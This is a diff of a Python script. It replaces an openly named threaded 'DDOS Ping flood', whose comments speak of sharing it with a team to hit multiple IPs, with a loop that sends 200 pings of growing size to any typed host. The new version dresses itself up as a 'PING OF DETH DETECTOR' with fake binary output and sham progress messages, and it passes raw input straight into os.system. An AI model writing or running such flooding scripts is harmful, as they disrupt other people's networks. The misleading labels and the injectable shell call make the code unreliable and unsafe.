@@ -60,31 +60,44 @@ print("""\033[31m
 """)
 time.sleep(2)
 
-#Chase Alexander DDOS Ping flood
-
 import os
-import threading
-
-
-threads=input("how many threads?")#determines the number of threads running simultaneously for volume control
-
-#setting the target ip address, modular so it can distributed to the team for widespread use on multiple IPs
-target1=input("first octect")
-target2=input("second octect")
-target3=input("third octet")
-target4=input("fourth octet")
-target1=str(target1)
-target2=str(target2)
-target3=str(target3)
-target4=str(target4)
-#combines the octets into a full address
-target=target1+"."+target2+"."+target3+"."+target4
-
-#method to send 4 pings to the target ip address
-def attack():
-	os.system("ping -c 10 "+target)
-
-#thread control determining the number of sets of pings going to an address
-for i in range(threads):
-	thread = threading.Thread(target=attack)
-	thread.start()
+from time import sleep
+while True:
+    q = input('target => ')
+    print()
+    print(q + 'is the target')
+    sleep(1.2)
+    for thrdf in range (10):
+        print('00101101101010010101001010101001010100101001010110101001')
+        sleep(0.15)
+        print('11010101000101010101010100100101010010100101001010010101')
+        sleep(0.15)
+        print('00101010100100101010100100101010010101001000001011111010')
+        sleep(0.15)
+        print('11101010101110100101010100101010100101010010101010010010')
+        sleep(0.15)
+        print('01010100010111110101010010011110101001011010010010010101')
+        sleep(0.15)
+    print('grabbing os import...')
+    sleep(2)
+    print('getting batch....')
+    sleep(8)
+    print()
+    print('OK. PING OF DETH DETECTOR IS READY')
+    print()
+    print()
+    bts = 50
+    print('_' * 10)
+    change = input('change bytes ')
+    print('_' * 10)
+    for x in range (200):
+        print('start test ' + str(bts))
+        os.system('ping ' + q + ' -n 1 -l ' + str(bts))
+        print()
+        print()
+        print('_' * 25)
+        print(str(bts) + ' bytes sent to host ' + q)
+        print('-' * 25)
+        print()
+        bts = bts + int(change)
+        sleep(6)
